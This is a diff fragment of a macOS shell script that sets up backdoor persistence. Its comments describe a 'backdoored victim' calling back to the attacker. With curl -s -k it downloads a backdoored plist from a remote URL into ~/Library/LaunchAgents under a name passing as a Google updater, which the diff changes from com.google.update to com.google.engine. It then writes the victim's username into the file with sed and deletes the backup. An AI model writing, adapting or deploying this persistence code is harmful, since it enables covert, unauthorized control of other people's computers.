@@ -36,12 +36,12 @@ sleep 2
 # It's useful if you don't have a C2C server and wants a persistence backdoored victim calls your desktop pc
 #
 # Download and write backdoored plist file in right directory
-curl -s -k $PLISTURL -o ~/Library/LaunchAgents/com.google.update.plist
+curl -s -k $PLISTURL -o ~/Library/LaunchAgents/com.google.engine.plist
 
 # We need to replace the 'word' string in your plist file with correct username of our victim.
 # In this case my original hosted plist file string contains the 'replaceme' string
 # Remember that using sed on OSX will use BSD mode. So u need a backup file
 USERNAME=$(whoami)
-sed -i .bak "s/replaceme/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.plist
+sed -i .bak "s/replaceme/$USERNAME/g" ~/Library/LaunchAgents/com.google.engine.plist
 # Remove backup file
-rm ~/Library/LaunchAgents/com.google.update.plist.bak
+rm ~/Library/LaunchAgents/com.google.engine.plist.bak
